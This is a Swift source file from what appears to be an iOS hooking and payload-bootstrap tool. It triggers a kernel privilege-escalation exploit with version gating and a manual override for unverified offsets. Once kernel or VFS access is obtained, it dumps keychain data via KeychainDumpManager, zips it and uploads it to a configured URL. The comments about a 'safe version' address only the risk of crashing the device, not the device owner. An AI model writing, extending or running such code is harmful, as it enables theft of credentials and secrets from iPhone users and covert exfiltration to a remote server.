//
//  ShellBootstrap.swift
//  猎豹钩子软件 · 载荷引导
//
//  ★ 安全版（2026-11-23）
//
//  重要变更：
//    旧版会在启动 1.5 秒后自动跑内核提权。在未验证偏移的 iOS 版本上
//    （如 27.x）会导致 kernel panic / 重启循环。
//
//    现在：
//      · 启动后什么都不做，只记录环境
//      · 提权必须由用户在自检页里显式触发
//      · 偏移未验证的版本（> 26.3）默认禁止提权，需要手动绕过
//

import Foundation
import UIKit

enum ShellBootstrap {

    private static var started = false

    /// 已经真机验证过偏移的版本上限。
    /// 26.0–26.3 有源码级验证；之后的都是推算值，默认不跑。
    static let verifiedMaxMajor = 26
    static let verifiedMaxMinor = 3

    /// 用户在自检页里点过「我确认要提权」才置 true
    static var userOverrideUnverified = false

    static func scheduleStart() {
        guard !started else { return }
        started = true
        // 只记录环境，不做任何危险操作
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
            log("外壳已就绪")
            log("设备 \(KeychainDumpManager.sysctlString("hw.machine") ?? "?") / iOS \(UIDevice.current.systemVersion)")
            log("安全模式：不会自动提权。需要时请在自检页手动触发")
        }
    }

    private static func log(_ s: String) {
        laramgr.shared.logmsg("[shell] " + s)
    }

    // MARK: - 版本闸门

    /// 当前版本是否在「已真机验证」范围内
    static func offsetsVerified() -> Bool {
        let parts = UIDevice.current.systemVersion.split(separator: ".")
        let major = Int(parts.first.map(String.init) ?? "0") ?? 0
        let minor = parts.count > 1 ? (Int(parts[1]) ?? 0) : 0
        if major < verifiedMaxMajor { return true }
        if major == verifiedMaxMajor && minor <= verifiedMaxMinor { return true }
        return false
    }

    static func versionBlocker() -> String? {
        if offsetsVerified() { return nil }
        if userOverrideUnverified { return nil }
        return "iOS \(UIDevice.current.systemVersion) 的偏移尚未真机验证，默认不执行提权。"
            + "在自检页里可以手动放开，但有 kernel panic 风险。"
    }

    // MARK: - 手动触发（由自检页调用）

    /// 用户显式请求提权
    static func runExploitManually(completion: @escaping (Bool, String) -> Void) {
        let mgr = laramgr.shared

        if let blocker = versionBlocker() {
            log("拒绝提权：\(blocker)")
            completion(false, blocker)
            return
        }

        if mgr.dsready {
            log("已经有内核读写权限")
            completion(true, "已就绪")
            return
        }

        log("用户手动触发 kernel exploit")
        mgr.run { ok in
            log("kernel \(ok ? "ok" : "fail")")
            completion(ok, ok ? "提权成功" : "提权失败")
        }
    }

    // MARK: - 采集（只在已有权限时执行）

    static func collectIfReady() {
        let mgr = laramgr.shared
        guard mgr.dsready || mgr.vfsready else {
            log("没有内核或 vfs 权限，跳过采集")
            return
        }
        if mgr.vfsready {
            collectAndUpload()
        } else {
            mgr.vfsinit { _ in
                collectAndUpload()
            }
        }
    }

    private static func collectAndUpload() {
        DispatchQueue.global(qos: .utility).async {
            log("开始采集")
            guard let data = KeychainDumpManager.shared.collectAll() else {
                log("采集失败")
                return
            }
            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            let f = docs.appendingPathComponent("dump_\(Int(Date().timeIntervalSince1970)).zip")
            try? data.write(to: f)
            log("采集完成 \(data.count) B → \(f.lastPathComponent)")

            let url = UserDefaults.standard.string(forKey: "keychain.uploadURL") ?? ""
            guard !url.isEmpty else { return }
            Uploader.upload(payload: data, to: url) { ok, msg in
                log("上传 \(ok ? "ok" : "fail") \(msg)")
            }
        }
    }
}
